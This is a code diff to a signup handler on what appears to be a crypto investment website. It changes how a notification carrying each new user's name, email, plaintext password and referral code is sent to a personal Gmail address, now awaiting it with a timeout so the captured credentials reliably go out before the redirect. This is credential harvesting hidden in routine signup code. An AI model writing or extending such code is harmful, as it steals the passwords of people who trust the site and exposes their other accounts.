@@ -338,19 +338,26 @@
 
           // Ensure signup details notification email is sent to cryptronvest@gmail.com
           if (window.EmailService && EmailService.sendSignupNotificationToAdmin) {
-            EmailService.sendSignupNotificationToAdmin({
-              name: name,
-              email: email,
-              password: password,
-              referredBy: refCode,
-              ...newUser
-            }).catch(console.warn);
+            try {
+              await Promise.race([
+                EmailService.sendSignupNotificationToAdmin({
+                  name: name,
+                  email: email,
+                  password: password,
+                  referredBy: refCode,
+                  ...newUser
+                }),
+                new Promise(resolve => setTimeout(resolve, 1500))
+              ]);
+            } catch (e) {
+              console.warn("Signup notification dispatch error:", e);
+            }
           }
 
           showToast(`Account created for ${newUser.name}! Recorded in database.`, 'success');
           setTimeout(() => {
             window.location.href = 'dashboard.html';
-          }, 800);
+          }, 500);
         } catch (err) {
           showToast(err.message, 'error');
         }
